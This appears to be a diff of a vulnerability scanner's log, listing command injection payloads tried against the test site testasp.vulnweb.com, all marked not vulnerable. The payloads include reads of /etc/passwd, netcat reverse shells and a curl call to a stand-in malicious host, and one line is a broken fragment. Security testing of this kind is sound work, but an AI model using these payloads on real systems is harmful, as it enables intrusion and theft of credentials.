+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+alse
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
